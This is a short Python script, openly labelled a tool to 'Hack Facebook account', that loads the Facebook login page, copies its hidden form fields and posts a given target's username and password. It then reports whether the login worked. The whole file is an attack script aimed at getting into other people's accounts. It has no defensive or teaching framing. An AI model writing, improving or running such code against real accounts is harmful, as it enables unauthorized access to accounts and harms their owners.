import requests
import argparse
from bs4 import BeautifulSoup

class Hack():
    def __init__(self, username, password, url):
        self.__username = username
        self.__password = password
        self.__url = url


    def _get_website(self):
        try:
            session = requests.Session()

            response = session.get(self.__url)

            if response.status_code == 200:
                soup = BeautifulSoup(response.content, "html.parser")
                inputs = soup.find_all("input")
                
                self.__start_hacking(session, inputs)
            
        except requests.exceptions.ConnectionError:
            print(f"\n[-] No website found with url {self.__url}!\n")

    
    def __start_hacking(self, session, inputs):
        data = {}
        for input in inputs:
            if input.has_attr("value"):
                data[input["name"]] = input["value"]

        data["email"] = self.__username
        data["pass"] = self.__password

        response = session.post(self.__url, data=data)

        if "Log out" in response.text:
            print(f"[+] Login successful at username: {self.__username} & password: {self.__password}!\n")
        else:
            print(f"[-] Login unsuccessful!\n")


def start():
    parser = argparse.ArgumentParser(description="Hack Facebook account")

    parser.add_argument("-username", type=str, help="Username of the target")
    parser.add_argument("-password", type=str, help="Password of the target")

    args = parser.parse_args()

    hack = Hack(username=args.username, password=args.password, url="https://www.facebook.com")
    hack._get_website()


start()